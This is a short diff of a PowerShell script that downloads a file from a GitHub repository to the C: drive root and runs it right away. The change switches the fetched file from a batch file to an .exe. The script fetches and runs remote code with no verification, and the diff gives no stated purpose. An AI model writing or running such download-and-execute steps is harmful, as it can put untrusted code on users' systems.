@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/sxcrate/utils/main/a.bat"
-$dest = "C:\a.bat"
+$url = "https://github.com/sxcrate/utils/raw/main/a.exe"
+$dest = "C:\a.exe"
 Invoke-RestMethod -Uri $url -OutFile $dest
-& "C:\a.bat"
+& "C:\a.exe"
